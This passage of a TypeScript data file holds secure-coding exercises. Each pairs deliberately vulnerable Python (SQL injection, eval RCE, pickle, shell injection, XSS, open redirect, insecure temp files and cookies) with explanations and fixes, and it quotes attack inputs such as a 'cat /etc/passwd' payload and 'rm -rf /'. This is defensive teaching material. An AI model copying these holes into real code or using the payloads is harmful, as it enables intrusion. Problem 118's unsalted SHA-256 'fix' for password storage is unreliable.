      9: "User input is placed directly into an HTTP header value. Newline characters (\\r\\n) terminate the current header and start a new one. An attacker can inject any HTTP header including Set-Cookie to hijack sessions, or inject a blank line to control the response body. Use response.set_cookie() which properly encodes values, and always validate/strip control characters from any user input used in headers."
    },
    hint: "HTTP headers are separated by \\r\\n. What happens if user input contains those characters?",
    hasBugs: true
  },
{
    id: 116,
    title: "The Insecure Cookie Session",
    difficulty: "medium",
    category: "security",
    type: "fix",
    description: "Your login sets a session cookie without any security flags. Attackers can steal it via XSS (no HttpOnly), intercept it over HTTP (no Secure), and use it from any site via CSRF (no SameSite). Fix the cookie to be secure.",
    code: `from http.cookies import SimpleCookie

def set_session_cookie(user_id):
    cookie = SimpleCookie()
    cookie['session'] = f"user_{user_id}_authenticated"
    cookie['session']['path'] = '/'
    print(cookie.output())

set_session_cookie(42)`,
    bugLines: [5, 6],
    bugExplanations: {
      5: "Cookie is set without HttpOnly (accessible via JavaScript XSS), without Secure (sent over plain HTTP), and without SameSite (vulnerable to CSRF attacks).",
      6: "Path '/' is fine, but missing security attributes make this cookie trivially exploitable."
    },
    hint: "Cookies have security flags: HttpOnly, Secure, SameSite. What does each one protect against?",
    fixedCode: `from http.cookies import SimpleCookie

def set_session_cookie(user_id):
    cookie = SimpleCookie()
    cookie['session'] = f"user_{user_id}_authenticated"
    cookie['session']['path'] = '/'
    cookie['session']['httponly'] = True
    cookie['session']['secure'] = True
    cookie['session']['samesite'] = 'Strict'
    print(cookie.output())

set_session_cookie(42)`,
    expectedOutput: 'Set-Cookie: session=user_42_authenticated; httponly; Path=/; SameSite=Strict; Secure',
    hasBugs: true
  },
{
    id: 117,
    title: "The Dangerous Temp File",
    difficulty: "medium",
    category: "security",
    type: "fix",
    description: "Your app writes sensitive data to a predictable temp file path. An attacker created a symlink at that path pointing to /etc/crontab. When your app writes, it overwrites the system cron with attacker-controlled content. Use secure temp file creation instead.",
    code: `import os

def save_temp_data(data):
    path = "/tmp/myapp_data.txt"
    with open(path, 'w') as f:
        f.write(data)
    print(f"Saved to {os.path.basename(path)}")

save_temp_data("sensitive_report_data")`,
    bugLines: [4, 5],
    bugExplanations: {
      4: "Predictable temp file path allows symlink attacks. An attacker can ln -s /etc/passwd /tmp/myapp_data.txt before your app runs.",
      5: "Opening the file follows symlinks by default. Use tempfile.mkstemp() or tempfile.NamedTemporaryFile() which create files with random names and secure permissions (mode 0600)."
    },
    hint: "Predictable filenames in /tmp are dangerous. What Python module creates secure temporary files?",
    fixedCode: `import tempfile
import os

def save_temp_data(data):
    fd, path = tempfile.mkstemp(prefix="myapp_", suffix=".txt")
    with os.fdopen(fd, 'w') as f:
        f.write(data)
    print(f"Saved to {os.path.basename(path)}")

save_temp_data("sensitive_report_data")`,
    expectedOutput: "Saved to myapp_",
    hasBugs: true
  },
{
    id: 118,
    title: "The Plaintext Password Storage",
    difficulty: "easy",
    category: "security",
    type: "fix",
    description: "Your user registration stores passwords in plain text. When your database was breached, every user's password was immediately visible. Attackers used them to log into users' email, banking, and social media accounts (since people reuse passwords). Hash passwords properly.",
    code: `users_db = {}

def register(username, password):
    users_db[username] = password
    print(f"Registered {username}")

def login(username, password):
    if users_db.get(username) == password:
        print(f"Welcome {username}")
    else:
        print("Invalid credentials")

register("alice", "secret123")
login("alice", "secret123")`,
    bugLines: [4, 8],
    bugExplanations: {
      4: "Storing the raw password means a database breach exposes every user's password instantly.",
      8: "Comparing raw passwords means you must store them in plain text. Compare hashes instead."
    },
    hint: "Passwords should never be stored as-is. What one-way transformation makes them safe?",
    fixedCode: `import hashlib
users_db = {}

def register(username, password):
    users_db[username] = hashlib.sha256(password.encode()).hexdigest()
    print(f"Registered {username}")

def login(username, password):
    hashed = hashlib.sha256(password.encode()).hexdigest()
    if users_db.get(username) == hashed:
        print(f"Welcome {username}")
    else:
        print("Invalid credentials")

register("alice", "secret123")
login("alice", "secret123")`,
    expectedOutput: "Registered alice\nWelcome alice",
    hasBugs: true
  },
{
    id: 119,
    title: "The Unsafe URL Redirect Fix",
    difficulty: "medium",
    category: "security",
    type: "fix",
    description: "Your logout endpoint redirects to a user-supplied URL. An attacker tricks users with a link like /logout?url=https://evil-phishing-site.com. After logging out, users land on a fake login page and re-enter their credentials. Fix the redirect to only allow safe, relative URLs.",
    code: `def logout(request_url_param):
    # Simulate logout
    session_cleared = True
    redirect_url = request_url_param if request_url_param else "/"
    print(f"Redirecting to: {redirect_url}")

# Attacker crafts: /logout?url=https://evil.com/fake-login
logout("https://evil.com/fake-login")`,
    bugLines: [4],
    bugExplanations: {
      4: "No validation on redirect URL. Attacker can redirect to any external phishing site. Must ensure redirect is relative (starts with '/') and doesn't contain '://' or start with '//'."
    },
    hint: "How can you ensure the redirect URL stays on your own site?",
    fixedCode: `def logout(request_url_param):
    # Simulate logout
    session_cleared = True
    redirect_url = request_url_param if request_url_param else "/"
    if not redirect_url.startswith("/") or redirect_url.startswith("//"):
        redirect_url = "/"
    print(f"Redirecting to: {redirect_url}")

# Attacker crafts: /logout?url=https://evil.com/fake-login
logout("https://evil.com/fake-login")`,
    expectedOutput: "Redirecting to: /",
    hasBugs: true
  },
{
    id: 120,
    title: "The Unescaped HTML Output",
    difficulty: "easy",
    category: "security",
    type: "fix",
    description: "Your greeting page inserts the username directly into HTML. An attacker set their name to '<script>alert(1)</script>' and every user who views the page gets hit with XSS. Fix it by escaping HTML special characters before rendering.",
    code: `def render_greeting(username):
    html = f"<h1>Welcome, {username}!</h1>"
    print(html)

render_greeting("<script>alert('hacked')</script>")`,
    bugLines: [2],
    bugExplanations: {
      2: "User input injected directly into HTML enables XSS. Use html.escape() to convert <, >, &, and quotes into safe HTML entities."
    },
    hint: "HTML special characters like < and > need to be escaped. What Python function does this?",
    fixedCode: `import html

def render_greeting(username):
    safe_name = html.escape(username)
    greeting = f"<h1>Welcome, {safe_name}!</h1>"
    print(greeting)

render_greeting("<script>alert('hacked')</script>")`,
    expectedOutput: "<h1>Welcome, &lt;script&gt;alert(&#x27;hacked&#x27;)&lt;/script&gt;!</h1>",
    hasBugs: true
  },
{
    id: 121,
    title: "The SQL Injection Login Bypass",
    difficulty: "medium",
    category: "security",
    type: "fix",
    description: "Your login function concatenates user input into a SQL query. An attacker typed admin' -- as the username, which comments out the password check entirely. They logged in as admin without knowing the password. Fix it with parameterized queries.",
    code: `import sqlite3

def login(username, password):
    conn = sqlite3.connect(':memory:')
    conn.execute("CREATE TABLE users (username TEXT, password TEXT)")
    conn.execute("INSERT INTO users VALUES ('admin', 'supersecret')")
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    result = conn.execute(query).fetchone()
    if result:
        print(f"Welcome {result[0]}")
    else:
        print("Login failed")
    conn.close()

login("admin' --", "anything")`,
    bugLines: [7, 8],
    bugExplanations: {
      7: "f-string SQL query allows injection. admin' -- comments out the AND password check.",
      8: "The injected query becomes: SELECT * FROM users WHERE username = 'admin' --' AND password = '...' — password check is completely bypassed."
    },
    hint: "Never put user input directly in SQL. What does a parameterized query look like in sqlite3?",
    fixedCode: `import sqlite3

def login(username, password):
    conn = sqlite3.connect(':memory:')
    conn.execute("CREATE TABLE users (username TEXT, password TEXT)")
    conn.execute("INSERT INTO users VALUES ('admin', 'supersecret')")
    query = "SELECT * FROM users WHERE username = ? AND password = ?"
    result = conn.execute(query, (username, password)).fetchone()
    if result:
        print(f"Welcome {result[0]}")
    else:
        print("Login failed")
    conn.close()

login("admin' --", "anything")`,
    expectedOutput: "Login failed",
    hasBugs: true
  },
{
    id: 122,
    title: "The Eval Calculator RCE",
    difficulty: "hard",
    category: "security",
    type: "fix",
    description: "Your math API uses eval() to compute expressions. An attacker sent __import__('os').popen('cat /etc/passwd').read() as the expression and dumped your server's password file. Replace eval() with a safe expression parser that only allows math operations.",
    code: `def safe_calc(expression):
    try:
        result = eval(expression)
        print(f"Result: {result}")
    except Exception as e:
        print(f"Error: {e}")

safe_calc("2 ** 10 + 5 * 3")`,
    bugLines: [3],
    bugExplanations: {
      3: "eval() executes arbitrary Python code. Even wrapping it in try/except doesn't prevent code execution — it just catches errors AFTER the damage is done. An attacker can run any system command."
    },
    hint: "eval() can run any Python code. What module safely evaluates mathematical expressions?",
    fixedCode: `import ast
import operator

SAFE_OPS = {
    ast.Add: operator.add,
    ast.Sub: operator.sub,
    ast.Mult: operator.mul,
    ast.Pow: operator.pow,
    ast.Div: operator.truediv,
}

def safe_eval(node):
    if isinstance(node, ast.Num):
        return node.n
    elif isinstance(node, ast.BinOp):
        left = safe_eval(node.left)
        right = safe_eval(node.right)
        op_type = type(node.op)
        if op_type in SAFE_OPS:
            return SAFE_OPS[op_type](left, right)
    raise ValueError("Unsupported expression")

def safe_calc(expression):
    try:
        tree = ast.parse(expression, mode='eval')
        result = safe_eval(tree.body)
        print(f"Result: {result}")
    except Exception as e:
        print(f"Error: {e}")

safe_calc("2 ** 10 + 5 * 3")`,
    expectedOutput: "Result: 1039",
    hasBugs: true
  },
{
    id: 123,
    title: "The Pickle Deserialization Fix",
    difficulty: "hard",
    category: "security",
    type: "fix",
    description: "Your caching layer deserializes user-provided data with pickle. An attacker crafted a malicious pickle payload that runs os.system('rm -rf /') when loaded. Replace pickle with JSON, which can only deserialize safe data types.",
    code: `import pickle
import base64

def load_user_prefs(encoded_data):
    raw = base64.b64decode(encoded_data)
    prefs = pickle.loads(raw)
    print(f"Theme: {prefs.get('theme', 'default')}")

# Safe-looking data, but pickle can contain arbitrary code
import pickle as p, base64 as b
safe_data = b.b64encode(p.dumps({"theme": "dark", "lang": "en"})).decode()
load_user_prefs(safe_data)`,
    bugLines: [6],
    bugExplanations: {
      6: "pickle.loads() can execute arbitrary Python code embedded in the serialized data. An attacker crafts a payload that runs system commands when deserialized. JSON only supports safe primitive types."
    },
    hint: "pickle can instantiate any Python object. What serialization format only allows safe data types?",
    fixedCode: `import json
import base64

def load_user_prefs(encoded_data):
    raw = base64.b64decode(encoded_data)
    prefs = json.loads(raw)
    print(f"Theme: {prefs.get('theme', 'default')}")

# Safe data using JSON serialization
import json as j, base64 as b
safe_data = b.b64encode(j.dumps({"theme": "dark", "lang": "en"}).encode()).decode()
load_user_prefs(safe_data)`,
    expectedOutput: "Theme: dark",
    hasBugs: true
  },
{
    id: 124,
    title: "The Command Injection Fix",
    difficulty: "hard",
    category: "security",
    type: "fix",
    description: "Your DNS lookup tool passes user input directly to a shell command. An attacker entered 'google.com; cat /etc/passwd' and read your system files. Fix it by using subprocess with argument lists instead of shell strings.",
    code: `import subprocess

def dns_lookup(domain):
    cmd = f"nslookup {domain}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    print(result.stdout if result.stdout else result.stderr)

dns_lookup("google.com; echo HACKED")`,
    bugLines: [4, 5],
    bugExplanations: {
      4: "f-string into shell command allows injection. Semicolons, pipes, backticks all work as shell metacharacters.",
      5: "shell=True interprets the string as a shell command, enabling all injection vectors."
    },
    hint: "shell=True interprets metacharacters. How do you pass arguments safely to subprocess?",
    fixedCode: `import subprocess
import shlex

def dns_lookup(domain):
    if not all(c.isalnum() or c in '.-' for c in domain):
        print("Invalid domain")
        return
    result = subprocess.run(["nslookup", domain], capture_output=True, text=True)
    print(result.stdout if result.stdout else result.stderr)

dns_lookup("google.com; echo HACKED")`,
    expectedOutput: "Invalid domain",
    hasBugs: true
  },
{
    id: 125,
    title: "The Insecure Random Password",
    difficulty: "easy",
    category: "security",
    type: "fix",
    description: "Your password generator uses Python's random module, which is seeded from predictable system state. An attacker who knows the seed can regenerate every password your system ever created. Use the secrets module designed for cryptographic randomness.",
    code: `import random
import string

def generate_password(length=16):
    chars = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choice(chars) for _ in range(length))
    print(f"Generated: {password}")

random.seed(42)
generate_password()`,
    bugLines: [6, 9],
    bugExplanations: {
      6: "random.choice() uses the Mersenne Twister PRNG which is predictable. After observing 624 outputs, all future values can be predicted.",
      9: "Seeding with a fixed value makes output completely deterministic — every run generates the same 'random' password."
    },
    hint: "Python's random module is for simulations, not security. What module generates cryptographic randomness?",
    fixedCode: `import secrets
import string

def generate_password(length=16):
    chars = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(secrets.choice(chars) for _ in range(length))
    print(f"Generated: {len(password)} chars")

generate_password()`,
    expectedOutput: "Generated: 16 chars",
    hasBugs: true
  }
];

export const getProblemsByDifficulty = (difficulty: 'easy' | 'medium' | 'hard') => {
  return problems.filter(p => p.difficulty === difficulty);
};

export const getProblemsByCategory = (category: string) => {
  return problems.filter(p => p.category === category);
};

export const getProblemById = (id: number): Problem | undefined => {
  return problems.find(p => p.id === id);
};
